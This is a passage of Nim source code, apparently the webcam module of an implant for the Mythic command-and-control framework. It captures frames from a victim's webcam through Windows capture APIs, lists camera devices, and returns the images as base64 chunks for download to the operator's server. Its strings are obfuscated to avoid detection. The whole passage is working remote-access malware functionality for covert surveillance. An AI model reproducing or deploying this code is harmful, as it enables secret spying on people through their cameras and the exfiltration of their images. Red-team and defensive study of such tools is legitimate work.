      debugLog "webcam", "Failed to connect to camera device ", deviceIndex
      return

    defer:
      discard SendMessageA(hCapWnd, WM_CAP_DRIVER_DISCONNECT, 0, 0)

    # Allow camera to warm up
    Sleep(500)

    # Grab a single frame
    if SendMessageA(hCapWnd, WM_CAP_GRAB_FRAME_NOSTOP, 0, 0) == 0:
      debugLog "webcam", "Failed to grab frame from camera"
      return

    # Copy frame to clipboard
    discard SendMessageA(hCapWnd, WM_CAP_EDIT_COPY, 0, 0)

    # Get the image from the clipboard
    if OpenClipboard(0) == 0:
      debugLog "webcam", "Failed to open clipboard for webcam frame"
      return

    defer:
      CloseClipboard()

    let hBitmap = GetClipboardData(CF_BITMAP)
    if hBitmap == 0:
      debugLog "webcam", "No bitmap data in clipboard after webcam capture"
      return

    # Get bitmap dimensions
    var bm: BITMAP
    if GetObjectA(hBitmap, int32(sizeof(BITMAP)), cast[LPVOID](addr bm)) == 0:
      debugLog "webcam", "Failed to get bitmap object"
      return

    let width = bm.bmWidth
    let height = bm.bmHeight

    if width <= 0 or height <= 0:
      debugLog "webcam", "Invalid bitmap dimensions: ", width, "x", height
      return

    # Create a pixie image
    var image = newImage(width, height)

    # Get bitmap bits via GetDIBits
    let hScreen = GetDC(0)
    let hDC = CreateCompatibleDC(hScreen)

    var bmi: BITMAPINFO
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER).DWORD
    bmi.bmiHeader.biWidth = width
    bmi.bmiHeader.biHeight = height  # bottom-up
    bmi.bmiHeader.biPlanes = 1
    bmi.bmiHeader.biBitCount = 32
    bmi.bmiHeader.biCompression = BI_RGB

    var pixelData = newSeq[byte](width * height * 4)
    discard GetDIBits(hDC, hBitmap, 0, height.UINT,
                      cast[pointer](addr pixelData[0]), addr bmi, DIB_RGB_COLORS)

    DeleteDC(hDC)
    ReleaseDC(0, hScreen)

    # Copy into pixie image (BGRA -> RGBA, flip vertically)
    for y in 0 ..< height:
      for x in 0 ..< width:
        let srcIdx = ((height - 1 - y) * width + x) * 4
        let dstIdx = (y * width + x)
        if srcIdx + 3 < pixelData.len and dstIdx < image.data.len:
          image.data[dstIdx].r = pixelData[srcIdx + 2]
          image.data[dstIdx].g = pixelData[srcIdx + 1]
          image.data[dstIdx].b = pixelData[srcIdx + 0]
          image.data[dstIdx].a = 255

    # Encode as PNG
    result = cast[seq[byte]](image.encodeImage(PngFormat))

proc webcamList*(taskId: string, params: JsonNode): JsonNode =
  ## List available webcam devices (Media Foundation)
  when defined(windows):
    try:
      let mfDevices = enumerateWebcamsMF()

      if mfDevices.len == 0:
        # Fallback to DirectShow if MF enumeration failed
        let dsDevices = enumerateWebcamsDShow()
        if dsDevices.len == 0:
          return mythicSuccess(taskId, obf("No webcam devices found."))
        var output = obf("Webcam Devices:\n")
        output.add(obf("==============\n"))
        for dev in dsDevices:
          output.add(&"  [{dev.index}] {dev.name}\n")
        output.add(&"\n{dsDevices.len}" & obf(" device(s) found.\n"))
        output.add(obf("\nUse device_index with webcam_snap to capture from a specific camera."))
        return mythicSuccess(taskId, output)

      var output = obf("Webcam Devices:\n")
      output.add(obf("==============\n"))
      for dev in mfDevices:
        output.add(&"  [{dev.index}] {dev.name}\n")
      output.add(&"\n{mfDevices.len}" & obf(" device(s) found.\n"))
      output.add(obf("\nUse device_index with webcam_snap to capture from a specific camera."))

      return mythicSuccess(taskId, output)
    except Exception as e:
      return mythicError(taskId, obf("Error enumerating webcam devices: ") & e.msg)
  else:
    return mythicError(taskId, obf("webcam_list is only available on Windows"))

proc webcamSnap*(taskId: string, params: JsonNode): JsonNode =
  ## Capture a single photo from a webcam and initiate download to Mythic
  when defined(windows):
    try:
      var deviceIndex = 0
      if params.hasKey(obf("device_index")):
        deviceIndex = params[obf("device_index")].getInt()

      debugLog "webcam", &"Capturing webcam frame from device {deviceIndex}"

      let frameData = captureWebcamFrame(deviceIndex)
      if frameData.len == 0:
        return mythicError(taskId, obf("Failed to capture webcam frame. Device may not be available or connected."))

      let totalChunks = int((frameData.len.float / CHUNK_SIZE.float).ceil)
      debugLog "webcam", &"Webcam frame captured: {frameData.len} bytes, {totalChunks} chunks"

      let downloadResponse = %*{
        obf("total_chunks"): totalChunks,
        obf("full_path"): "",
        obf("host"): getHostname(),
        obf("filename"): "",
        obf("is_screenshot"): true,
        obf("chunk_size"): CHUNK_SIZE
      }

      return %*{
        obf("task_id"): taskId,
        obf("download"): downloadResponse,
        obf("screenshot_data"): encode(frameData)
      }
    except Exception as e:
      return mythicError(taskId, obf("Failed to capture webcam: ") & e.msg)
  else:
    return mythicError(taskId, obf("webcam_snap is only available on Windows"))

proc processWebcamSnapChunk*(taskId: string, fileId: string, data: seq[byte], chunkNum: int): JsonNode =
  ## Process a single chunk of the webcam snap data
  try:
    let offset = (chunkNum - 1) * CHUNK_SIZE
    let endPos = min(offset + CHUNK_SIZE, data.len)
    let chunkSize = endPos - offset

    var chunkData = newSeq[byte](chunkSize)
    copyMem(addr chunkData[0], unsafeAddr data[offset], chunkSize)

    let encodedChunk = encode(chunkData)

    let chunkResponse = %*{
      obf("chunk_num"): chunkNum,
      obf("file_id"): fileId,
      obf("chunk_data"): encodedChunk,
      obf("chunk_size"): chunkSize
    }

    return %*{
      obf("task_id"): taskId,
      obf("download"): chunkResponse
    }
  except Exception as e:
    return mythicError(taskId, obf("Error processing webcam chunk ") & $chunkNum & ": " & e.msg)

proc completeWebcamSnap*(taskId: string, fileId: string): JsonNode =
  ## Complete the webcam snap task
  return mythicSuccess(taskId, fileId)
